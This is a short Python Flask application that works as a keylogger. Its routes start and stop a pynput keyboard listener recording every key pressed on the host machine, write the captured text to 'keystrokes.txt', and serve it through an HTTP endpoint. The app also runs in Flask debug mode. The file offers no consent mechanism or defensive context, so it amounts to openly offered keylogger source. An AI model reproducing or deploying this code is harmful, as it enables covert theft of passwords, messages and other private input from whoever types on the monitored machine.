from flask import Flask, render_template, request, jsonify
from pynput import keyboard
import threading

app = Flask(__name__)

keystrokes = []
listener = None

@app.route('/')
def index():
    return render_template('index.html')


@app.route('/start_keylogger', methods=['POST'])
def start_keylogger():
    global listener
    if listener is None or not listener.is_alive():
        def on_press(key):
            try:
                keystrokes.append(key.char)
            except AttributeError:
                keystrokes.append(str(key))
            if key == keyboard.Key.esc:
                return False  # Stop listener

        listener = keyboard.Listener(on_press=on_press)
        listener.start()
    return jsonify(success=True)


@app.route('/stop_keylogger', methods=['POST'])
def stop_keylogger():
    global listener
    if listener is not None:
        listener.stop()
        listener = None
    with open('keystrokes.txt', 'w') as f:
        f.write(''.join(keystrokes))
    return jsonify(success=True)


@app.route('/get_keystrokes', methods=['GET'])
def get_keystrokes():
    return jsonify(keystrokes=''.join(keystrokes))


if __name__ == '__main__':
    app.run(debug=True)
